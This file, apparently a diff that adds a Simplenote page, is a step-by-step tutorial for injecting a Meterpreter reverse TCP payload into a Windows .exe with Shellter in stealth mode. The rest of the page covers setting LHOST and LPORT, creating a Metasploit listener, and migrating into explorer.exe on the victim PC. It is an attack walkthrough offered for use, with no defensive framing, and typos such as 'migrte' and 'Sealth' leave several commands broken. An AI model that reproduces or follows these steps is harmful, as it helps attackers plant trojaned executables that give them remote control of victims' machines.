@@ -1,0 +1,43 @@
+
+
+Inject Payload Inside Windows Applications or .exe Files
+
+root@Mr~Malware:~# apt-get install shellter root@Mr~Malware:~# shellter
+
+Choose Opration Mode
+
+Auto/Manual (A/M/H) : A(For Auto)
+PE Target: /root/Desktop/FileName.exe
+(protable Executable File Name & Path) Press [Enter] to Continue....(Press [Enter] for Continue)
+
+Enable Sealth Mode? (Y/N/H): Y(Press "Y" For Yes)
+
+********** *Payloads* **********
+[1] Meterpreter_Reverse_TCP[stager]
+[2] Meterpreter_Reverse_HTTP[stager]
+[3] Meterpreter_Reverse_HTTPS[stager]
+[4] Meterpreter_Bind_TCP[stager]
+[5] Shell_Reverse_TCP[stager]
+[6] Shell_Bind_TCP[stager]
+[7] WinExec[stager]
+
+Use a listed Payload or Custom? (L/C/H): L(Press "L" For List)
+
+Select payload by index: 1
+[1] Meterpreter_Reverse_TCP
+
+************************* *meterpreter_reverse_tcp* *************************
+
+SET LHOST: (IP Address OF Machine)(For Local Network Use only)
+
+SET LPORT: (Port NO.) 443
+Press [Enter] to Continue... (Press [Enter])
+
+Now Create A Listner with Metasploit
+
+meterpreter> ps(For Check Process of Victim PC)
+Now Transfer(Migrate) The Payload To Other Process with Process ID no.
+
+meterpreter> migrte 4524("4524" is The Process ID of explorer.exe)
+Published with Simplenote
+Report abuse
